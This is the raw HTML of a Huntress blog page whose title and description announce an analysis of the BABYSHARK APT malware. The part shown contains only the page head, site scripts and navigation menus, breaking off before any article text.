<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9f33356fc04f46a2ac4a68753ba41658"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc2118b00ed614bbf83f96f25de0beaf8"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ffe85f84d0b0c4f9f8743167664735836"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F124e49f43fd041659989deffd90e3b7c"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa59264f69adf4a4cb0092faaf95a5669"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2a9064f27e10467cae2ee3bd79beead9"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff043c73bb2de45c6b1102fe11ffebedb"/><link rel="preload" as="image" href="https://cdn.builder.io/api/v1/pixel?apiKey=3eb6f92aedf74f109c7b4b0897ec39a8"/><script type="text/javascript" async="" defer="" src="/assets/scripts/drift.js"></script><script type="text/javascript" async="" defer="" src="//js.hs-scripts.com/3911692.js"></script><script type="text/javascript" async="" defer="" src="https://fast.wistia.com/embed/medias/lqy5p1741e.jsonp"></script><script type="text/javascript" async="" defer="" src="https://fast.wistia.com/assets/external/E-v1.js"></script><script type="text/javascript" src="https://flackr.github.io/scroll-timeline/dist/scroll-timeline.js" async=""></script><meta property="og:type" content="website"/><meta content="summary_large_image" name="twitter:card"/><title>Targeted APT Activity: BABYSHARK Is Out for Blood | Huntress</title><meta name="description" content="We discovered malicious, targeted advanced persistent threat (APT) activity on a partner&#x27;s system. Here, we dive into the BABYSHARK malware strain."/><meta property="og:title" content="Targeted APT Activity: BABYSHARK Is Out for Blood | Huntress"/><meta property="og:description" content="We discovered malicious, targeted advanced persistent threat (APT) activity on a partner&#x27;s system. Here, we dive into the BABYSHARK malware strain."/><meta property="og:image" content="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd57bfd4fcc4b4b0f8685dcd9308d7d98"/><meta property="twitter:title" content="Targeted APT Activity: BABYSHARK Is Out for Blood | Huntress"/><meta property="twitter:description" content="We discovered malicious, targeted advanced persistent threat (APT) activity on a partner&#x27;s system. Here, we dive into the BABYSHARK malware strain."/><meta property="twitter:image" content="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd57bfd4fcc4b4b0f8685dcd9308d7d98"/><link rel="canonical" href="https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood"/><link rel="icon" href="/assets/favicon-96x96-CtLNOBqH.png" type="image/png" sizes="96x96"/><link rel="icon" href="/assets/favicon-29P8YngA.svg" type="image/svg+xml"/><link rel="shortcut icon" href="/assets/favicon-C5x0nhzu.ico"/><link rel="apple-touch-icon" href="/assets/apple-touch-icon-DudXUahm.png" sizes="180x180"/><link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIkh1bnRyZXNzIiwKICAic2hvcnRfbmFtZSI6ICJIdW50cmVzcyIsCiAgImljb25zIjogWwogICAgewogICAgICAic3JjIjogIi93ZWItYXBwLW1hbmlmZXN0LTE5MngxOTIucG5nIiwKICAgICAgInNpemVzIjogIjE5MngxOTIiLAogICAgICAidHlwZSI6ICJpbWFnZS9wbmciLAogICAgICAicHVycG9zZSI6ICJtYXNrYWJsZSIKICAgIH0sCiAgICB7CiAgICAgICJzcmMiOiAiL3dlYi1hcHAtbWFuaWZlc3QtNTEyeDUxMi5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIsCiAgICAgICJwdXJwb3NlIjogIm1hc2thYmxlIgogICAgfQogIF0sCiAgInRoZW1lX2NvbG9yIjogIiNmZmZmZmYiLAogICJiYWNrZ3JvdW5kX2NvbG9yIjogIiNmZmZmZmYiLAogICJkaXNwbGF5IjogInN0YW5kYWxvbmUiCn0="/><meta name="google-site-verification" content="QZk47k59WXGOBjZRZodH6wC5rKaX9MnmeBFsV5jchE4"/><link rel="modulepreload" href="/assets/entry.client-SQ3q5yjc.js"/><link rel="modulepreload" href="/assets/chunk-D4RADZKF-LqBHOxl5.js"/><link rel="modulepreload" href="/assets/index-DJsMTf3_.js"/><link rel="modulepreload" href="/assets/root-CxA1SAwR.js"/><link rel="modulepreload" href="/assets/root-CMTQ8QH5.js"/><link rel="modulepreload" href="/assets/with-props-zRNoRGa1.js"/><link rel="modulepreload" href="/assets/blocks-exports-Ds8r2STp.js"/><link rel="modulepreload" href="/assets/blog._slug-DGtNaz02.js"/><link rel="modulepreload" href="/assets/metadata-DVv6nMOk.js"/><script type="text/javascript" src="/assets/scripts/gtm.js"></script><link rel="stylesheet" href="/assets/root-C5LLCb9u.css"/><link rel="stylesheet" href="/assets/blocks-exports-DgxdbFYj.css"/><link rel="stylesheet" href="/assets/blog-post-CbkYeKVf.css"/><link rel="stylesheet" href="/assets/font-TvAYd24d.css"/><link rel="stylesheet" href="/assets/webflow.styles-DLoAM9VT.css"/><link rel="stylesheet" href="/assets/webflow.head.styles-CJDXdWRQ.css"/><link rel="stylesheet" href="/assets/webflow.supplimental.styles-DVu-rAsj.css"/><link rel="stylesheet" href="/assets/app-BAk7t8Z0.css"/><link rel="stylesheet" href="/assets/metadata-BxXzbT5t.css"/><script src="https://cdn.optimizely.com/js/5179843176824832.js"></script></head><body class="body"><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TXRTDGW4" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2" type="image/webp"/><style data-emotion-css="2qdlcf">.css-2qdlcf{opacity:1;-webkit-transition:opacity 0.2s ease-in-out;transition:opacity 0.2s ease-in-out;object-fit:cover;object-position:center;}</style><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image banner-ellipse desktop css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F6a889f843f1c43a695dc53a813b091e2"/></picture><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff" type="image/webp"/><style data-emotion-css="2qdlcf">.css-2qdlcf{opacity:1;-webkit-transition:opacity 0.2s ease-in-out;transition:opacity 0.2s ease-in-out;object-fit:cover;object-position:center;}</style><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image banner-ellipse mobile css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F494235849aa5452690cabfa164b509ff"/></picture></div><header id="main-site-header" class="header header-navigation-override " style="will-change:background"><div data-animation="default" class="navbar-logo-left-container shadow-three w-nav" data-easing2="ease" data-easing="ease" data-collapse="medium" role="banner" data-no-scroll="1" data-duration="400" data-doc-height="1"><div class="search-bar navigation-wrapper-top" style="opacity:1;height:40px"><a href="https://huntress.io/" target="_blank" class="top-bar-links">Partner Login</a><div class="search-container nav "><span class="span search ">Search</span><form class="nav-search w-form " data-hs-cf-bound="true" action="/search"><input class="nav-search-input w-input " autoComplete="false" maxLength="256" placeholder="Search..." type="search" id="header-search" name="query"/><input type="submit" class="nav-search-button w-button" value=""/><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1758ef4667574398807a9dd0b08d4990" loading="lazy" alt="close icon" class="nav-search-close "/></form><div class="nav-search-overlay"></div></div></div><div class="navigation-wrapper"><a href="/" class="navigation-brand link w-nav-brand" aria-label="home"><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02" type="image/webp"/><style data-emotion-css="2qdlcf">.css-2qdlcf{opacity:1;-webkit-transition:opacity 0.2s ease-in-out;transition:opacity 0.2s ease-in-out;object-fit:cover;object-position:center;}</style><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image navigation-brand css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F06a4b9203b3a41a382bad4efd601ae02"/></picture></a><nav role="navigation" class="navigation-menu-wrapper w-nav-menu hidden lg:block"><ul role="list" class="nav-menu-main mobile w-list-unstyled"><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu desktop-only w-dropdown"><div class="menu-link-container w-dropdown-toggle " aria-controls="w-dropdown-list-0" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Platform</div></div><nav class="sub-menu-dropdown one w-dropdown-list " aria-labelledby="w-dropdown-toggle-0"><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block">Huntress Managed Security Platform</div><div class="sub-menu-item-main"><a href="/platform/managed-edr" aria-current="page" class="sub-menu-item-2 w-inline-block w--current" tabindex="0"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9a581d96024446599c07e34e19c93b07" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed EDR</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Get full visibility, detection, and response for your endpoints.</div></a><a href="/platform/security-awareness-training" class="sub-menu-item-2 tablet-hide w-inline-block" tabindex="0"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img width="98.5" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0563b097f1c748188681789c23fe204a" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed Security Awareness Training</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Empower your teams with science-backed security awareness training.</div></a></div><a href="/platform" class="secondary-button hide-tablet w-inline-block" tabindex="0"><div class="secodnary-button-text">Platform Overview</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div><div class="nav-dropdown-column"><div class="sub-menu-item-main"><div class="spacer-52"></div><a href="/platform/managed-itdr" class="sub-menu-item-2 w-inline-block" tabindex="0"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img width="95.5" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ffd3a938d7dfc41bdac34c3f46a36afb2" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed ITDR</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Protect your Microsoft 365 identities and email environments.</div></a><a href="/platform/siem" class="sub-menu-item-2 w-inline-block" tabindex="0"><div class="submenu-item-wrapper w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b905e-3a6d5916"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F5638ee75bf42433c81332c153db5cb15" alt="" class="submenu-desktop-icon"/></div><h6 class="submenu-title-2">Managed SIEM</h6></div><div class="submenu-text-block-2 w-node-f8864d3f-fbc9-1b92-70a4-cb1f0c1b9063-3a6d5916">Managed threat response and robust compliance support at a predictable price.</div></a></div><a href="/platform" class="secondary-button hide-desktop w-inline-block" tabindex="0"><div class="secodnary-button-text">Platform Overview</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div><div class="nav-dropdown-column background-color-gray"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F675068d5b65d403cac4485154bb5ca16" loading="lazy" alt="" class="platform-nav-image"/><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">Learn More</h6><div class="submenu-text-block-2">Try Huntress for free and <br/>deploy in minutes to start <br/>fighting threats.</div></div><a href="/demo" class="secondary-button w-inline-block" tabindex="0"><div class="secodnary-button-text">Request a Demo</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></nav></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu desktop-only w-dropdown"><div class="menu-link-container w-dropdown-toggle " aria-controls="w-dropdown-list-1" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Solutions</div></div><nav class="sub-menu-dropdown four w-dropdown-list " aria-labelledby="w-dropdown-toggle-1"><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block">Solutions by Topic</div><div class="sub-menu-item-main"><a href="/solutions/topics/phishing" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd8af97b52a364281ae4ae771eac29f60" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Phishing</h6></div></a></div><div class="sub-menu-item-main"><a href="/solutions/topics/cybersecurity-compliance" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F5437345f68ab4fecb25e1bf64d596f05" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Compliance</h6></div></a></div><div class="sub-menu-item-main"><a href="/solutions/topics/business-email-compromise" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe0006e0247a84d538abfdb56270b1971" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Business Email Compromise</h6></div></a></div></div><div class="nav-dropdown-column"><div class="submenu-text-block">Solutions by Industry</div><div class="sub-menu-item-main"><a href="/industries/education" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F4951efeb175d46a28d43a56e44f1aaa6" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Education</h6></div></a><a href="/industries/financial-services" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2c6e56c396984defa968946c3305fd5d" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Finance</h6></div></a><a href="/industries/healthcare" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fad40fb4e0e8f4fc3a283928e18d2cb07" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Healthcare</h6></div></a><a href="/industries/manufacturing" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa1a16399f6f94c3da8e42ddbe735c1c1" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Manufacturing</h6></div></a><a href="/industries/state-and-local-government" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fdafe6a53f78a407c80691541d7e292b9" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">State &amp; Local Government</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray"><div class="submenu-text-block no-border hide-tablet">Featured Resource</div><a href="/industries/healthcare/healthcare-resource-kit" class="sub-menu-nav w-inline-block" tabindex="0"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F906b12f80f904ae6b4753ee4a19183a7" loading="lazy" alt="" class="platform-nav-image last-column"/></a><div class="sub-menu-item-main"><div class="submenu-item-wrapper no-icon"><h6 class="submenu-title-2">Healthcare Cybersecurity Success Kit</h6><div class="submenu-text-block-2">Packed with the information, tools, and guidance you need to keep your organization running smoothly and, most importantly, your patients safe.</div></div><a href="/industries/healthcare/healthcare-resource-kit" class="secondary-button w-inline-block" tabindex="0"><div class="secodnary-button-text">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="right arrow" class="secondary-button-icon"/></a></div></div></div></nav></div></li><li class="menu-list-item-wrapper"><div data-hover="true" data-delay="0" blocks-name="navbar1_menu-dropdown" class="nav-dropdown-main-menu desktop-only w-dropdown"><div class="menu-link-container w-dropdown-toggle " aria-controls="w-dropdown-list-2" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="menu-link-text underline-hover">Why Huntress</div></div><nav class="sub-menu-dropdown two w-dropdown-list " aria-labelledby="w-dropdown-toggle-2"><div class="nav-dropdown-wrapper"><div class="nav-dropdown-column"><div class="submenu-text-block">Who We Serve</div><div class="sub-menu-item-main"><a href="/why-huntress/managed-service-providers" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="100" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F721ae206651e4037bf5e134b3d7a7ae6" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Managed Service Providers</h6></div></a><a href="/why-huntress/value-added-resellers" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="98.5" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff0209e5a35e34a25a31075aca24dec96" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Value Added Resellers</h6></div></a><a href="/why-huntress/businesses-it-teams" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff257bebdca1c45cab6259f8436ca7221" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Business &amp; IT Teams</h6></div></a></div></div><div class="nav-dropdown-column"><div class="submenu-text-block no-border">The Huntress Difference</div><div class="sub-menu-item-main"><a href="/why-huntress/24-7-soc" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc7a2dd82c76547b8830a35af9c98a511" alt="" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Huntress SOC</h6></div></a><a href="/success-stories" class="sub-menu-item-2 single-row w-inline-block" tabindex="0"><div class="submenu-icon-wrapper"><img width="51" loading="lazy" alt="" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9f5b67604e284cb9bdf92a9a456fa608" class="submenu-desktop-icon"/></div><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Case Studies</h6></div></a></div></div><div class="nav-dropdown-column background-color-gray"><div class="submenu-text-block no-border">Compare Huntress</div><div class="tablet-grid"><a href="/comparison/huntress-vs-bitdefender" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Bitdefender</h6></div></a><a href="/comparison/huntress-vs-blackpoint" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Blackpoint</h6></div></a><a href="/comparison/huntress-vs-crowdstrike" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">CrowdStrike</h6></div></a><a href="/comparison/huntress-vs-datto" class="sub-menu-item-2 single-row bottom_spacing_small w-inline-block" tabindex="0"><div class="submenu-item-wrapper"><h6 class="submenu-title-2">Datto</h6></div></a><a href="/comparison/huntress-vs-sentinelone" class="sub-menu-item-2 single-row bottom_spacing_small 